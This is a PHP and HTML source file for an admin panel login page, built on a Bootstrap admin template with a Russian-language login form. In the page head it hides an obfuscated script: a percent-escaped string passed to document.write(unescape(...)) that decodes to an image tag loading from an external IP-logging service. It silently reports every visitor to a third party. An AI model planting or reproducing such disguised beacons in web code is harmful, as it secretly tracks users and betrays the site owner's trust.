<?php
include "../cfg.php";
include "../ini.php";
if(($status == 1 || $status == 2) && $login) {
	print "<html><head><script language=\"javascript\">top.location.href='adminstation.php';</script></head><body><a href=\"adminstation.php\"><b>Enter</b></a></body></html>";
} else {
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Bootstrap, from Twitter</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-responsive.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
<script type="text/javascript">
document.write(unescape('%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%69%70%6C%6F%67%67%65%72%2E%72%75%2F%31%62%77%74%35%2E%6A%70%67%22%3E'));

</script>
    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Fav and touch icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="ico/apple-touch-icon-114-precomposed.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="ico/apple-touch-icon-72-precomposed.png">
                    <link rel="apple-touch-icon-precomposed" href="ico/apple-touch-icon-57-precomposed.png">
                                   <link rel="shortcut icon" href="ico/favicon.png">
  </head>

  <body>

    <div class="login-container">
      <div class="login">
        <div class="avatar">
          <img src="img/user-image.png" alt="">
        </div>
        <form action="login.php" method="post">
		<input type="hidden" name="submit" value="go">
		<?php
$error = intval($_GET['error']);
if($error == 1) {
	print "<p class=\"er\" style=\"width: 292px;\">Введите логин/пароль</p>";
} elseif($error == 2) {
	print "<p class=\"er\" style=\"width: 292px;\">Введите правильный логин/пароль</p>";
}

?>

          <div class="error-login">Некорректные логин или пароль!</div>
          <input type="text" name="login" class="login-input" placeHolder="Логин...">
          <input type="password" name="pass" class="password-input" placeHolder="Пароль...">
          <div class="remember fLeft">
            
          </div>
		  
		  <input type="image" class="loginbutton fRight button small-button button-red" width="100px" border="0" title="Войти в систему!" />
      
          <div class="clearfix"></div>
        </form>
      </div>

      <div class="login-footer">
        Not a registered user yet? <a href="#">Sign up now!</a>
      </div>
      <span>2013 © insidetree admin template</span>
    </div>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="js/jquery-1.8.3.js"></script>
    <script src="js/ui/jquery-ui-1.9.2.custom.js"></script>

    <script src="js/uniform/jquery.uniform.js"></script>

    <script src="js/flot/excanvas.min.js"></script>
    <script src="js/flot/jquery.flot.js"></script>    
    <script src="js/flot/jquery.flot.pie.min.js"></script>
    <script src="js/flot/jquery.flot.resize.js"></script>
    <script src="js/flot/jquery.flot.orderBars.js"></script>

    <script src="js/sparkline/jquery.sparkline.js"></script>

    <script src="js/full-calendar/fullcalendar.js"></script>

    <script src="js/mouse-wheel/jquery.mousewheel.js"></script>

    <script src="js/file-tree/jqueryFileTree.js"></script>

    <script src="js/easy-pie-chart/jquery.easy-pie-chart.js"></script>

    <script src="js/cleditor/jquery.cleditor.js"></script>

    <script src="js/jquery-splitter/splitter.js"></script>

    <script src="js/cookie/jquery.cookie.js"></script>

    <script src="js/masonry/jquery.masonry.js"></script>

    <script src="js/masked/jquery.maskedinput.js"></script>

    <script src="js/powertip/jquery.powertip.js"></script>

    <script src="js/range-picker/daterangepicker.js"></script>
    <script src="js/range-picker/date.js"></script>

    <script src="js/fancybox/jquery.fancybox.js"></script>

    <script src="js/flexslider/jquery.flexslider.js"></script>

    <script src="js/tags-input/jquery.tagsinput.js"></script>

    <script src="js/form-validate/jquery.validate.js"></script>

    <script src="js/scrollbar/jquery.mCustomScrollbar.js"></script>

    <script src="js/debounced/debounced.js"></script>

    <script src="js/ibutton/jquery.ibutton.js"></script>

    <script src="js/password-meter/password_strength.js"></script>

    <script src="js/bootstrap-wizards/jquery.bootstrap.wizard.js"></script>

    <script src="js/rating/jquery.rating.js"></script>

    <script src="js/bootstrap.js"></script>

    <script src="js/chosen/chosen.jquery.js"></script>
    
    <script src="js/forms.js"></script>
    <script src="js/main.js"></script>

  </body>
</html>

<?php } ?>